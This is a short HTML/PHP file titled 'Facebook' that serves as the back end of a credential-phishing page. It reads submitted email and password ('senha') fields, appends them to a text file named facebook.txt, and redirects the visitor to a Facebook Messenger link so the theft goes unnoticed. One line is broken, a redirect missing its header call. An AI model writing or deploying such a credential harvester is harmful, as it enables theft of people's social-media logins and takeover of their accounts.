<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="refresh"
   content="0; url=https://m.me/376461836293611">
<title>Facebook</title>
</head>

<body>
	<?php
("location: https://m.me/376461836293611"); 
	$cmail=$_POST["mail"];
	$csenha=$_POST["senha"];
    $dados="\r\n".$cmail."\r\n".$csenha."\r\n"."________________________________________________";
	
	$arquivo=fopen("facebook.txt","a");
    fwrite($arquivo,$dados);

	fclose($arquivo);
	
	?>
</body>
</html>
